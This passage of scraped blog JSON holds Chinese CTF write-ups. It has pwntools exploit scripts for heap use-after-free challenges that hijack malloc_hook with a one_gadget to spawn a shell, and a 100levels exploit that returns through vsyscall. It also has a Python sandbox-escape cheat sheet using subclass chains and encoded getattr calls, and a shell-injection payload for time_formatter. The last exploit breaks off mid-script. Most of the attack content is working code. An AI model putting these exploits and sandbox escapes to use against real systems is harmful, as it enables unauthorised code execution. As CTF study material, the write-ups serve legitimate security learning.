分析这个程序的问题在于分配chunk时，会检查内容是否相同，如果相同的话，就不再多分配chunk，只会分配结构体 chunk然后将其中的指针指向已知的chunk，也就会出现两个指针指向同一个chunk，我们就可以UAF 1if ( ptrStop &amp;&amp; !strcmp((const char *)ptrStop-&gt;chunk_ptr, &amp;s2) ) 而其实这就已经是极大的漏洞了，利用这个洞完全可以泄露libc然后覆盖fd指针到malloc_hook， one_gadget 一把梭getshell 完全没必要总去想着控制链表指针什么的…费力不讨好 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *#context.log_level = &apos;debug&apos;sh=process(&apos;./pwn&apos;)#sh=remote(&apos;&apos;)#(&apos;85c3e0fcae5e972af313488de60e8a5a.kr-lab.com&apos;,&apos;58512&apos;)#(&apos;111.198.29.45&apos;,&apos;32440&apos;)elf = ELF(&apos;./pwn&apos;)def show(idx): sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;) sh.sendlineafter(&apos;index: &apos;,str(idx))def new(con): sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;) sh.sendlineafter(&apos;data:\\n&apos;,con)def edit(idx,con): sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;) sh.sendlineafter(&apos;index: &apos;,str(idx)) sh.sendline(con)def dele(idx): sh.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;) sh.sendlineafter(&apos;index: &apos;,str(idx))new(&apos;a&apos;*8)new(&apos;a&apos;*8)new(&apos;b&apos;*8)new(&apos;c&apos;*0x80)new(&apos;c&apos;*0x80)new(&apos;d&apos;*0x60)new(&apos;d&apos;*0x60)new(&apos;e&apos;*0x20)#----------------leak heap base------------------------------//没有必要， 所以其实可以更短dele(2)dele(0)show(1)heap = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;))-0x60print hex(heap)new(&apos;d&apos;*8)new(&apos;a&apos;*8)#---------------leak libc base-----------------------------dele(3)show(4)libc = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\x00&apos;))-88-0x3c4b20print hex(libc)one = libc+0x4526aprint hex(one)new(&apos;c&apos;*0x80)#------------------hjack malloc_hook to getshell-----------dele(5)edit(6,p64(libc+0x3c4b20-0x33))new(&apos;d&apos;*0x60)new(&apos;a&apos;*0x13+p64(one)+p64(0)*9)sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)sh.sendline(&apos;end&apos;)#gdb.attach(sh)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"Escape from python-jail","slug":"escape-from-python-jail","date":"2019-04-08T13:05:19.000Z","updated":"2019-05-09T07:55:50.603Z","comments":true,"path":"2019/04/08/escape-from-python-jail/","link":"","permalink":"http://siriuswhiter.tk/2019/04/08/escape-from-python-jail/","excerpt":"","text":"python 沙盒原理python沙盒逃逸其实就是如何通过绕过限制，拿到出题人或者安全运维人员不想让我们拿到的”危险函数”，或者绕过Python终端达到命令执行的效果。 从这个角度来讲，沙盒逃逸本身更像是偏web的东西，就像是sql注入在被过滤的剩余字符中通过骚操作来执行不该被执行的命令一样。 关于查看目标主机是否为docker cat /proc/self/cgroup mount -v 任意执行命令的一些函数和模块 import 函数 1__import__(&apos;os&apos;).system(&apos;dir&apos;) os 模块 12345import osos.system(&quot;/bin/sh&quot;)os.popen(&quot;/bin/sh&quot;) 很少不被禁，不然很容易被利用getshell官方文档 https://docs.python.org/2/library/os.html 1234&gt;&gt;&gt; import os&gt;&gt;&gt; os.system(&quot;/bin/sh&quot;)$ whoamisirius exec &amp; eval 函数 123eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;)exec(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;) 两个执行函数，没什么可说的。。123&gt;&gt;&gt; eval(&apos;__import__(&quot;os&quot;).system(&quot;/bin/sh&quot;)&apos;)$ whoamisirius execfile 函数 执行文件，主要用于引入模块来执行命令python3不存在 timeit 函数 from timeit 模块 12import timeittimeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;,number=1) 1234&gt;&gt;&gt; import timeit&gt;&gt;&gt; timeit.timeit(&apos;__import__(&quot;os&quot;).system(&quot;sh&quot;)&apos;,number=1)$ whoamisirius platform 模块 12import platform print platform.popen(&apos;dir&apos;).read() platform提供了很多方法去获取操作系统的信息，popen函数可以执行任意命令 123&gt;&gt;&gt; import platform &gt;&gt;&gt; print platform.popen(&apos;dir&apos;).read()jail.py commands 模块 123import commandsprint commands.getoutput(&quot;dir&quot;)print commands.getstatusoutput(&quot;dir&quot;) 依旧可以用来执行部分指令，貌似不可以拿shell，但其他的很多都可以 12345&gt;&gt;&gt; import commands&gt;&gt;&gt; print commands.getoutput(&quot;dir&quot;)flag jail.py&gt;&gt;&gt; print commands.getstatusoutput(&quot;dir&quot;)(0, &apos;flag jail.py&apos;) subprocess模块 12import subprocesssubprocess.call([&apos;ls&apos;],shell=True) shell=True 命令本身被bash启动，支持shell启动，否则不支持 123&gt;&gt;&gt; import subprocess&gt;&gt;&gt; subprocess.call([&apos;ls&apos;],shell=True)flag jail.py compile 函数 12 菜鸟：http://www.runoob.com/python/python-func-compile.html f修饰符 1f&apos;&#123;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#125;&apos; python 3.6加上的新特性，用f,F修饰的字符串可以执行代码。 文件操作 file 函数 1file(&apos;flag.txt&apos;).read() open 函数 1open(&apos;flag.txt&apos;).read() codecs 12import codecscodecs.open(&apos;test.txt&apos;).read() Filetype 函数 from types 模块 12import typesprint types.FileType(&quot;flag&quot;).read() 可以用来读取文件123&gt;&gt;&gt; import types&gt;&gt;&gt; print types.FileType(&quot;flag&quot;).read()flag_here 关于python内部查看版本号，可以使用sys模块 1234&gt;&gt;&gt; import sys&gt;&gt;&gt; print sys.version2.7.12 (default, Nov 12 2018, 14:36:49) [GCC 5.4.0 20160609] 绕过检查import / os 引入使用内联函数： import函数 import函数本身是用来动态的导入模块，比如：import(module) == import module 12a = __import__(&quot;bf&quot;.decode(&apos;rot_13&apos;)) //os a.system(&apos;sh&apos;) importlib库 123import importliba = importlib.import_module(&quot;bf&quot;.decode(&apos;rot_13&apos;)) //osa.system(&apos;sh&apos;) builtins函数 使用 python 内置函数 builtins (该函数模块中的函数都被自动引入，不需要再单独引入) , dir(builtins) 查看剩余可用内置函数 12&gt;&gt;&gt; dir(__builtins__)[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;] 这里是在没有禁用函数时的情况， 可以看到里面有一些一般不会禁用的函数比如说对文件的操作函数 open，int，chr等，还有dict函数 一个模块对象有一个由字典对象实现的命名空间…属性引用被转换为这个字典中的查找，例如，m.x等同于m.dict[“x”],我们就可以用一些编码来绕过字符明文检测。 所以可以有1__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).system(&apos;sh&apos;) == __builtins__.__dict__[_import__](&apos;os&apos;).system(&apos;sh&apos;) 路径引入os等模块 因为一般都是禁止引入敏感包，当禁用os时，实际上就是 sys.modules[‘os’]=None 而因为一般的类unix系统的python os路径都是/usr/lib/python2.7/os.py ,所以可以通过路径引入 12import syssys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos; reload 禁止引用某些函数时，可能会删除掉一些函数的引用,比如：1del __builtins__.__dict__[&apos;__import__&apos;] 这样就无法再引入，但是我们可以用 reload(builtins) 重载builtins模块恢复内置函数 但是reload本身也是builtins模块的函数，其本身也可能会被禁掉 在可以引用包的情况下，我们还可以使用imp模块 123import __builtins__import impimp.reload(__builtin__) 这样就可以得到完整的builtins模块了，需要注意的是需要先import builtins ,如果不写的话，虽然builtins模块已经被引入，但是它实际上是不可见的，即它仍然无法被找到,这里是这么说的： 1引入imp模块的reload函数能够生效的前提是，在最开始有这样的程序语句import __builtins__，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。 再如果imp的reload被禁用掉呢？同时禁用掉路径引入需要的sys模块呢？可以尝试上面的execfile()函数,或者open函数打开文件，exec执行代码 1execfile(&apos;/usr/lib/python2.7/os.py&apos;) 函数名字符串扫描过滤的绕过 假如沙箱本身不是通过对包的限制，而是扫描函数字符串，关键码等等来过滤的；而关键字和函数没有办法直接用字符串相关的编码或解密操作 这里就可以使用： getattr &amp;&amp; getattribute 1234567getattr(__import__(&quot;os&quot;),&quot;flfgrz&quot;.encode(&quot;rot13&quot;))(&apos;ls&apos;)getattr(__import__(&quot;os&quot;),&quot;metsys&quot;[::-1])(&apos;ls&apos;)__import__(&quot;os&quot;).__getattribute__(&quot;metsys&quot;[::-1])(&apos;ls&apos;)__import__(&quot;os&quot;).__getattribute__(&quot;flfgrz&quot;.encode(&quot;rot13&quot;))(&apos;ls&apos;) runoob ：http://www.runoob.com/python/python-func-getattr.html12如果某个类定义了 getattr() 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.getattr(‘color’)；而只会返回 x.color 已定义好的值。如果某个类定义了 __getattribute__() 方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）。 object 命令引入执行object 类中集成了很多基础函数，我们也可以用object来进行调用的操作 对于字符串对象：12&gt;&gt;&gt; ().__class__.__bases__(&lt;type &apos;object&apos;&gt;,) 通过base方法可以获取上一层继承关系 12&gt;&gt;&gt; &quot;&quot;.__class__.__mro__(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;) 通过mro方法获取继承关系 所以最常见的创建object对象的方法：1234&gt;&gt;&gt; ().__class__.__bases__[0]&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2]&lt;type &apos;object&apos;&gt; 在获取之后，返回的是一个元组，通过下标+subclasses的方法可以获取所有子类的列表。而subclasses()第40个是file类型的object。1234&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]&lt;type &apos;file&apos;&gt;&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[40]&lt;type &apos;file&apos;&gt; 所以可以读文件12().__class__.__bases__[0].__subclasses__()[40](&quot;jail.py&quot;).read()&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;jail.py&quot;).read() 同时写文件或执行任意命令1234().__class__.__bases__[0].__subclasses__()[40](&quot;jail.py&quot;,&quot;w&quot;).write(&quot;1111&quot;)().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;jail.py&quot;).read()&apos; ) 可以执行命令寻找subclasses下引入过os模块的模块123456&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;]&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;]&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; &quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;]&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt; 参考：http://shaobaobaoer.cn/archives/656/python-sandbox-escapehttps://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8Fhttp://yulige.top/?p=502","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"python","slug":"python","permalink":"http://siriuswhiter.tk/tags/python/"}]},{"title":"攻防世界-pwn prac","slug":"攻防世界-pwn-prac","date":"2019-04-06T06:32:55.000Z","updated":"2019-04-22T12:03:12.235Z","comments":true,"path":"2019/04/06/攻防世界-pwn-prac/","link":"","permalink":"http://siriuswhiter.tk/2019/04/06/攻防世界-pwn-prac/","excerpt":"","text":"100levels题目检查12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: PIE enabled 两个功能： go hint go:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int __fastcall go(__int64 a1, __int64 a2)&#123; int v3; // ST0C_4 __int64 v4; // [rsp+0h] [rbp-120h] __int64 num2; // [rsp+0h] [rbp-120h] int v6; // [rsp+8h] [rbp-118h] __int64 num1; // [rsp+10h] [rbp-110h] signed __int64 num1a; // [rsp+10h] [rbp-110h] signed __int64 cnt; // [rsp+18h] [rbp-108h] __int64 v10; // [rsp+20h] [rbp-100h] puts(&quot;How many levels?&quot;); v4 = get_num(); if ( v4 &gt; 0 ) num1 = v4; else puts(&quot;Coward&quot;); puts(&quot;Any more?&quot;); num2 = get_num(); num1a = num1 + num2; if ( num1a &gt; 0 ) &#123; if ( num1a &lt;= 99 ) &#123; cnt = num1a; &#125; else &#123; puts(&quot;You are being a real man.&quot;); cnt = 100LL; &#125; puts(&quot;Let&apos;s go!&apos;&quot;); v6 = time(0LL); if ( (unsigned int)check(cnt) != 0 ) &#123; v3 = time(0LL); sprintf((char *)&amp;v10, &quot;Great job! You finished %d levels in %d seconds\\n&quot;, cnt, (unsigned int)(v3 - v6), num2); puts((const char *)&amp;v10); &#125; else &#123; puts(&quot;You failed.&quot;); &#125; exit(0); &#125; return puts(&quot;Coward Coward Coward Coward Coward&quot;);&#125; go调用的check12345678910111213141516171819202122232425262728293031_BOOL8 __fastcall check(signed int cnt)&#123; int v2; // eax __int64 v3; // rax __int64 buf; // [rsp+10h] [rbp-30h] __int64 v5; // [rsp+18h] [rbp-28h] __int64 v6; // [rsp+20h] [rbp-20h] __int64 v7; // [rsp+28h] [rbp-18h] unsigned int v8; // [rsp+34h] [rbp-Ch] unsigned int num2; // [rsp+38h] [rbp-8h] unsigned int num1; // [rsp+3Ch] [rbp-4h] buf = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0LL; if ( !cnt ) return 1LL; if ( (unsigned int)check(cnt - 1) == 0 ) return 0LL; num1 = rand() % cnt; v2 = rand(); num2 = v2 % cnt; v8 = v2 % cnt * num1; puts(&quot;====================================================&quot;); printf(&quot;Level %d\\n&quot;, (unsigned int)cnt); printf(&quot;Question: %d * %d = ? Answer:&quot;, num1, num2); read(0, &amp;buf, 0x400uLL); // overflow v3 = strtol((const char *)&amp;buf, 0LL, 10); return v3 == v8;&#125; hint123456789101112131415161718int hint()&#123; signed __int64 v1; // [rsp+8h] [rbp-108h] int v2; // [rsp+10h] [rbp-100h] __int16 v3; // [rsp+14h] [rbp-FCh] if ( flag ) &#123; sprintf((char *)&amp;v1, &quot;Hint: %p\\n&quot;, &amp;system, &amp;system); &#125; else &#123; v1 = &apos;N NWP ON&apos;; v2 = &apos;UF O&apos;; v3 = &apos;N&apos;; &#125; return puts((const char *)&amp;v1);&#125; 分析思路一容易发现的漏洞就是check时的溢出，还有问题就是go初始时输入两次值，最后使用的是两次加起来的值，但是如果第一次输入的值小于等于0就不会初始化第一个值。 最刚开始的想法是通过溢出修改存储在bss段的flag位然后返回到主函数，再使用hint泄露system函数地址但是因为程序开启了pie，因此bss段位置也就是不定的，而如果想要泄露libc，又因为是64位程序，因此需要gadget，但是gadgets的位置也因为pie变得位置不定，所以行不通。 再观察程序，发现：hint函数是先将system函数地址读到了栈上，之后调用fprintf函数输出的，其地址为rbp-0x1101234var_110 = qword ptr -110hmov rax, cs:system_ptrmov [rbp+var_110], rax 而如果go读取的第一个数没有初始化的话，他的值就是栈上的值，而它的地址恰巧也是rbp-0x1101__int64 num1; // [rsp+10h] [rbp-110h] 所以我们按理说是可以利用那个对大小判断的函数来逐位爆破system的地址这里需要注意的是如果和大于0进入check，如果顺着令其运行完会直接退出，所以也需要在check中溢出覆盖返回地址以便能够继续爆破 而覆盖的返回地址依旧是不确定的，观察程序运行时的内存映射，发现程序的最后vsyscall段是恒定不变的，我们可以利用它来绕过pie；123456pwndbg&gt; x/10i 0xffffffffff600400 0xffffffffff600400: mov rax,0xc9 0xffffffffff600407: syscall 0xffffffffff600409: ret 0xffffffffff60040a: int3 0xffffffffff60040b: int3 思路二思路一没有复现成功，看到了大佬们的简单一点的思路 前面基本一致，但是不再去爆破system的地址，而是将其覆盖位one_gadget的地址，也就是计算二者偏移的差值然后将其加上去直接得到one_gadget RCE,可以看到这个地址被存放在了栈上，我们的目标就是在后面的栈溢出中想办法使得返回到此处。 执行最后一次时的栈情况：1234567803:0018│ rsi 0x7ffe36cd7780 ◂— 0x0... ↓07:0038│ 0x7ffe36cd77a0 ◂— 0x1ae0000000008:0040│ 0x7ffe36cd77a8 ◂— 0x2b0000000a /* &apos;\\n&apos; */09:0048│ rbp 0x7ffe36cd77b0 —▸ 0x7ffe36cd78e0 —▸ 0x7ffe36cd7920 —▸ 0x556f0672efd0 ◂— push r150a:0050│ 0x7ffe36cd77b8 —▸ 0x556f0672ec8a ◂— test eax, eax0b:0058│ 0x7ffe36cd77c0 ◂— 0xfffffffffffffeda0c:0060│ 0x7ffe36cd77c8 ◂— 0x556f5caa9f45 -------》 one_gadget 在这里 我们就可以使用vsyscall中的不变量来使返回地址滑向此处执行one_gadget 关于 vsyscall 简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall. exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *import syscontext.log_level = &quot;debug&quot;system_offset = 0x45390ret_address = 0xffffffffff600400target_offset = 0x4526adifference = target_offset - system_offsetdef answer(eqn): parse = eqn[9:eqn.find(&quot;=&quot;)] soln = eval(parse) return solndef main(): p = process(&quot;./100levels&quot;) #p = remote(&quot;47.74.147.103&quot;, 20001) p.sendline(&quot;2&quot;) p.clean() p.sendline(&quot;1&quot;) p.clean() p.sendline(&quot;0&quot;) p.clean() p.sendline(str(difference)) for i in range(99): p.recvline_contains(&quot;Level&quot;) eqn = p.clean() soln = answer(eqn) p.send(str(soln)+&quot;\\x00&quot;) pay = str(soln) + &quot;\\x00&quot; pay = pay.ljust(56, &quot;B&quot;) pay += p64(ret_address)*3 log.info(&quot;Injected our vsyscall ROPs&quot;) p.send(pay) p.clean() p.success(&quot;Shell spawned! Enjoy!&quot;) p.interactive()if __name__ == &quot;__main__&quot;: main() 未成功的思路一 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.log_level=&apos;debug&apos;sh=process(&apos;./100levels&apos;)#sh=remote(&apos;111.198.29.45&apos;,&apos;32440&apos;)elf = ELF(&apos;./100levels&apos;)libc = ELF(&apos;./libc.so&apos;)def go(level,more): sh.recvuntil(&apos;Choice:\\n&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;levels?\\n&apos;) sh.sendline(str(level)) sh.recvuntil(&apos;more?\\n&apos;) sh.sendline(str(more)) def hint(): sh.sendlineafter(&apos;Choice:\\n&apos;,&apos;2&apos;)def calc(answer): sh.sendlineafter(&apos;Answer:&apos;,answer)def leak(): start = 0x700000000390 for i in range(10,2,-1): for j in range(15,-1,-1): hint() addr_test = start+(1 &lt;&lt; (i*4)*j) go(0,-addr_test) a = sh.recvline() if &apos;Coward&apos; not in a: start = addr_test log.info(&apos;check &apos;+ hex(addr_test)) break pro = log.progress(&apos;go&apos;) for i in range(99): pro.status(&apos;level %d&apos;%(i+1)) calc(p64(0)*5) #gdb.attach(sh) calc(p64(0)*5+p64(0xffffffffff600400)*3) #gdb.attach(sh) pro.success(&apos;ok&apos;) return start + 0x100system=leak()print systembinsh_addr = system - libc.symbols[&apos;system&apos;]+libc.search(&apos;/bin/sh&apos;).next()pop_rdi_ret = system - libc.symbols[&apos;system&apos;]+0x21102pay = p64(pop_rdi_ret)+p64(binsh_addr)+p64(system)go(1,0)pay = &apos;0&apos;*0x38+paycalc(pay)#gdb.attach(sh)sh.interactive() 参考：https://bbs.ichunqiu.com/thread-43627-1-1.htmlhttps://nandynarwhals.org/hitbgsec2017-1000levels/https://znqt.github.io/hitb-gsec-pwn-1000levels/ monkey题目 &amp; 分析 &amp; exp算是js的沙箱逃逸，给了个The SpiderMonkey shell，可以查询到它的源码之类的东西，可以发现其没有任何过滤，所以给个os.system(“/bin/sh”) 直接拿shell即可 Escape_From_Jail-50题目python沙箱逃逸，只给了个远程连接，检测到被过滤的字符会报错 banned：1. / &apos; / import /flag /eval /exec / dir(__builtins__)无反馈 等等 分析 &amp; exp许多常见的基本上都被过滤了 不能使用import关键字且不允许使用 “.”，一大部分路就被绝了, os，未被过滤，但是基本调用需要”.”,所以需要其他方式。 查询资料发现 getattr函数可以使用 相关资料可以看菜鸟：http://www.runoob.com/python/python-func-getattr.html getattr(os,”system”)(“/bin/sh”) time_formatter比较有意思的一个题目，刚开始没看懂题。。 题目重点函数 1234567891011121314151617181920212223__int64 __fastcall print(__int64 a1, __int64 a2, __int64 a3)&#123; __int64 v3; // r8 char command; // [rsp+8h] [rbp-810h] unsigned __int64 v6; // [rsp+808h] [rbp-10h] v6 = __readfsqword(0x28u); if ( ptr ) &#123; __snprintf_chk(&amp;command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&apos;%s&apos;&quot;, (unsigned int)time, ptr, a3); __printf_chk(1LL, &quot;Your formatted time is: &quot;); fflush(stdout); if ( getenv(&quot;DEBUG&quot;) ) __fprintf_chk(stderr, 1LL, &quot;Running command: %s\\n&quot;, &amp;command, v3); setenv(&quot;TZ&quot;, value, 1); system(&amp;command); &#125; else &#123; puts(&quot;You haven&apos;t specified a format!&quot;); &#125; return 0LL;&#125; 退出1234567891011121314151617181920signed __int64 __noreturn exit()&#123; signed __int64 result; // rax char s; // [rsp+8h] [rbp-20h] unsigned __int64 v2; // [rsp+18h] [rbp-10h] v2 = __readfsqword(0x28u); free__(ptr); free__(value); __printf_chk(1LL, &quot;Are you sure you want to exit (y/N)? &quot;); fflush(stdout); fgets(&amp;s, 16, stdin); result = 0LL; if ( (s &amp; 0xDF) == 89 ) &#123; puts(&quot;OK, exiting.&quot;); result = 1LL; &#125; return result;&#125; 分析&amp;&amp;exp问题出在退出时先free然后再询问是否退出，这个时候选择不退出的话就会出现UAF漏洞 在system中执行command命令，command字符串通过snprintf_chk函数拼接起来，可以百度一下这个函数的用法，注意字符串/bin/date -d @%d +’%s’，按照linux 64的函数传参顺序，分别是rdi rsi rdx rcx r8 r9 然后是栈 ，所以此时%s对应第一个入栈的参数，也就是rax 也就是qword_602118，所以只要控制了qword_602118，就可以执行任意系统命令（注意闭合单引号）。 所以依次执行 1，5 / N ，3 / ‘;/bin/sh#’ , 4 即可 babyheap题目&amp;&amp;分析正常题目，edit时没有检查存储的size 所以虽然保护全开，我们仍然可以使用溢出来overlap来泄露地址及其他 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from pwn import *context.log_level = &apos;debug&apos;#sh=process(&apos;./babyheap&apos;)sh = remote(&apos;111.198.29.45&apos;,&apos;31717&apos;)elf = ELF(&apos;./babyheap&apos;)libc = ELF(&apos;./libc-2.23.so&apos;)def show(idx): sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;3&apos;) sh.sendline(str(idx))def new(length,con): sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;) sh.sendline(str(length)) sh.send(con)def edit(idx,length,con): sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;2&apos;) sh.sendline(str(idx)) sh.sendline(str(length)) sh.send(con)def dele(idx): sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;4&apos;) sh.sendline(str(idx))new(0x10,&apos;a&apos;*0x10) #0new(0x10,&apos;b&apos;*0x10) #1new(0x10,&apos;c&apos;*0x10) #2new(0x10,&apos;d&apos;*0x10) #3new(0x10,&apos;e&apos;*0x10) #4#--------------leak heap base----------------edit(0,0x20,&apos;a&apos;*0x18+p64(0x41))dele(1)new(0x30,&apos;b&apos;*0x18+p64(0x21)+&apos;c&apos;*0x10) #1dele(4)dele(2)show(1)sh.recvuntil(p64(0x21))heap = u64(sh.recv(8))-0x80print &apos;heap_base: &apos;+hex(heap)#--------------leak libc base----------------new(0x10,&apos;b&apos;*0x10) #2new(0x10,&apos;e&apos;*0x10) #4new(0x10,&apos;f&apos;*0x10) #5new(0x10,&apos;deadbeef&apos;*2) #6#new(0x90,&apos;c&apos;*0x90)edit(0,0x28,&apos;a&apos;*0x18+p64(0xa1)+&apos;a&apos;*8)#gdb.attach(sh)dele(1)new(0x10,&apos;b&apos;*0x10) #1#gdb.attach(sh)show(2)main_arena = u64(sh.recv(8))-88malloc_hook = main_arena - 0x10libc.base = malloc_hook - libc.symbols[&apos;__malloc_hook&apos;]one_gadget = libc.base+0x4526aprint &apos;libc: &apos;+hex(libc.base)#------------hjack malloc_hook to getshell----------new(0x70,&apos;c&apos;*0x60+p64(0)+p64(0x31)) #2 &amp; 